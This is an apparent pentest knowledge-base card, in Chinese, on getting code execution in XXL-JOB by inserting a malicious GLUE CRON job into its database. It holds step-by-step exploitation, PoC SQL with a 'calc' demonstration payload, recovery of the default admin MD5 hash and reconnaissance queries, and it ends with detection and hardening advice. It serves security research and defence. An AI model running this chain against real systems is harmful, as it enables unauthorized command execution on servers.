---
id: web-java-component-xxl-job-db-insert-cron-job-rce
title: XXL-JOB 数据库写入 xxl_job_info 恶意 CRON 任务：trigger_status 置 1 触发 executor 执行 GLUE 命令
type: scenario
domain: web
path: web/java/component
technique: xxl-job-db-insert-job-trigger-rce
tags:
- java
- xxl-job
- scheduler
- database
- mysql
- rce
- glue
- post-exploitation
- cron
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: 原文标注：2.4.1 实测可打通；旧版本经测试亦可（表结构略有差异，未给具体区间）
verification:
  verified_by: verifier-V520
  verified_at: '2026-11-11T13:17:43+08:00'
  notes: 已对照原文及截图核对：Nacos 身份伪造取数据源配置后连库、xxl_job 库表(图07/08)、information_schema.PROCESSLIST 定位 admin 连接来源(图09)、xxl_job_user 中 admin/e10adc3949ba59abbe56e057f20f883e(图10) 均与原文一致；INSERT 语句 24 个字段与取值逐字一致（含 trigger_status=0、GLUE_POWERSHELL、calc\n、schedule_conf 0/5 * * * * ?），并给出 UPDATE trigger_status=1 激活，符合原文'插入后把 trigger_status 改为 1'；affected_versions 如实记录'当前测试版本 2.4.1、旧版经测试亦可'，为原文明确表述。与 admin 默认口令卡、executor /run 卡入口不同（数据库写权限→调度触发），原子互不重复；dedup 候选为不同 sink 或不同产品。未验证点：未实际连库插入任务。
url: /docs/web/java/component/web-java-component-xxl-job-db-insert-cron-job-rce/
draft: false
kb_aliases:
- xxl_job_info 插入任务
- trigger_status getshell
- xxl-job 数据库定时任务
- xxl-job 数据库投毒
- xxl-job 从数据库 getshell
- GLUE_POWERSHELL 数据库任务
---

## 一句话结论

拿到 XXL-JOB 所用数据库的写权限后（例如先通过 Nacos 身份伪造读取到数据源配置），不必登录 admin；直接向 `xxl_job_info` 表插入一条 `schedule_type=CRON`、`glue_type=GLUE_POWERSHELL/SHELL/GROOVY`、`glue_source=<命令>` 的任务，并把 `trigger_status` 改为 1，admin 的调度线程就会在下一轮扫描时把任务下发给 executor 执行，形成“数据库投毒 → 调度系统自动触发”的 getshell 链。

## 原理

- **调度即数据库轮询**：xxl-job-admin 的调度线程按固定周期从 `xxl_job_info` 读取 `trigger_status=1` 的任务，依据 `schedule_type`（CRON/固定间隔等）与 `schedule_conf` 计算触发时间，到点后调用 executor 的 `ExecutorBiz#run` 下发执行。
- **任务字段即攻击面**：`glue_type` 决定执行引擎（`GLUE_POWERSHELL`/`GLUE_SHELL`/`GLUE_GROOVY` 等），`glue_source` 是脚本正文，`executor_handler` 留空时走 GLUE 模式；`schedule_conf` 控制频率（原文用 `0/5 * * * * ?`，每 5 秒一次）。这些字段全部由数据库内容决定，admin 不做二次校验。
- **为什么要改 trigger_status**：插入时 `trigger_status=0` 的任务不会被调度；将其更新为 1 后才进入调度队列（原文明示“插入之后把 trigger_status 的值改为 1，executor 便会自动开始执行”）。
- **前提来源**：原文实战中先利用目标的 Nacos 身份伪造漏洞拿到数据库配置文件（连接串/账号密码），连上 MySQL 后发现其中存在 `xxl_job` 库。数据库凭据通常权限较大（建库/写表），足以写任务表。
- **同库另有两条路**：`xxl_job_user` 表存 admin 口令的 MD5（默认 `123456` 对应 `e10adc...`），可解密或直接新增用户登录后台；`information_schema.PROCESSLIST` 能看到 admin 通过公网 IP 连接数据库的会话，据此可定位并扫描其 admin 端口，判断控制台是否公网暴露。
- **版本差异**：原文在 2.4.1 上实测，旧版本的表结构不同但经测试也能打通，字段以目标实际表结构为准。

## 触发条件

- 攻击者已取得 `xxl_job` 数据库的写权限（弱口令、配置泄露、Nacos 等配置中心漏洞、SQL 注入等路径）。
- admin 调度中心正常运行，且 `job_group` 对应分组下存在在线 executor（原库中已有正常任务即可判断）。
- 数据库可远程连接（原文场景为通过数据库客户端直连）。
- executor 可执行所选 `glue_type` 对应引擎的脚本。

## 利用步骤

1. 获取数据库配置并连接（原文经 Nacos 身份伪造拿到数据源配置），确认存在 `xxl_job` 库。
2. 查看 `xxl_job_group` 与已有任务，确认可用的 `job_group` 值（对应在线执行器）。
3. 向 `xxl_job_info` 插入恶意任务：`schedule_type=CRON`、`schedule_conf=0/5 * * * * ?`、`glue_type=GLUE_POWERSHELL`（Windows）或 `GLUE_SHELL`/`GLUE_GROOVY`（Linux）、`glue_source` 写命令、`executor_handler` 留空、`trigger_status=0`。
4. 执行 `UPDATE xxl_job_info SET trigger_status=1 WHERE id=<新任务id>;` 激活任务。
5. 等待最多数秒（CRON 每 5 秒），executor 自动执行；可在 admin 调度日志或主机侧验证命令效果。
6. 可选：读取 `xxl_job_user` 的 MD5 口令尝试解密，失败则新增用户（密码写 MD5）登录 admin 图形界面；用 `information_schema.PROCESSLIST` 定位 admin 连接来源 IP 并扫描其 8080 端口。

## PoC

向 `xxl_job_info` 插入任务（原文 SQL，`trigger_status` 先为 0）：

```sql
INSERT INTO `xxl_job`.`xxl_job_info`
(`id`, `job_group`, `job_desc`, `add_time`, `update_time`, `author`, `alarm_email`,
 `schedule_type`, `schedule_conf`, `misfire_strategy`, `executor_route_strategy`,
 `executor_handler`, `executor_param`, `executor_block_strategy`, `executor_timeout`,
 `executor_fail_retry_count`, `glue_type`, `glue_source`, `glue_remark`,
 `glue_updatetime`, `child_jobid`, `trigger_status`, `trigger_last_time`, `trigger_next_time`)
VALUES (7, 1, '22222', '2023-12-27 14:57:36', '2023-12-27 14:58:23', '22222', '',
        'CRON', '0/5 * * * * ?', 'DO_NOTHING', 'FIRST',
        '', '', 'SERIAL_EXECUTION', 0, 0,
        'GLUE_POWERSHELL', 'calc\n', '12312321',
        '2023-12-27 14:57:48', '', 0, 1703660320000, 1703660325000);
```

激活任务：

```sql
UPDATE `xxl_job`.`xxl_job_info` SET `trigger_status` = 1 WHERE `id` = 7;
```

读取 admin 口令哈希（默认 `admin/123456` 的 MD5）：

```sql
SELECT id, username, password FROM `xxl_job`.`xxl_job_user`;
-- e10adc3949ba59abbe56e057f20f883e = md5("123456")
```

定位 admin 数据库连接来源：

```sql
SELECT * FROM information_schema.PROCESSLIST;
```

说明：原文在 Windows 环境用 `GLUE_POWERSHELL` + `calc` 验证任务确实被调度执行；本卡未复跑。

## 变体与关联

- **凭据登录变体**：不改任务表，直接解密/替换 `xxl_job_user` 口令登录 admin 后建 GLUE 任务，见 [[web-java-component-xxl-job-admin-default-password-glue-task-rce]]。
- **直连 executor 变体**：若 executor 9999 可达，可跳过数据库直接 `/run`，见 [[web-java-component-xxl-job-executor-unauth-run-glue-rce]]、[[web-java-component-xxl-job-executor-run-default-token-rce]]。
- **上游入口**：数据库配置来源如 Nacos 身份伪造/默认密钥，见 [[web-java-component-nacos-server-identity-header-auth-bypass]]、[[web-java-component-nacos-default-token-secret-key-jwt-forge]]、[[pentest-lateral-movement-nacos-ua-bypass-config-minio-credentials]]。
- **同类调度系统**：PowerJob 等任务调度组件的缺失权限接口（见 [[web-generic-auth-powerjob-missing-apipermission-unauth-endpoints]]）可类比“调度系统即代码执行”。

## 检测与防御

- **数据库审计**：监控对 `xxl_job_info` 的 INSERT/UPDATE（尤其 `trigger_status` 由 0 变 1、`glue_type` 为 GLUE_*、`glue_source` 含系统命令的变更）；对 `xxl_job_user` 的查询/改密告警。
- **最小权限**：调度数据库账号仅授予业务所需权限；限制数据库远程访问来源，禁止公网直连。
- **配置中心加固**：修复 Nacos 身份伪造/默认密钥问题（升级、开鉴权、改默认 key），避免数据源配置泄露。
- **调度侧核查**：定期比对 `xxl_job_info` 任务与业务台账，发现无负责人/描述异常/高频 CRON 的任务；检查 admin 调度日志中 executor 的异常脚本执行。
- **主机/网络**：executor 侧监控 `gluesource` 落盘与进程派生；限制 executor 出站。
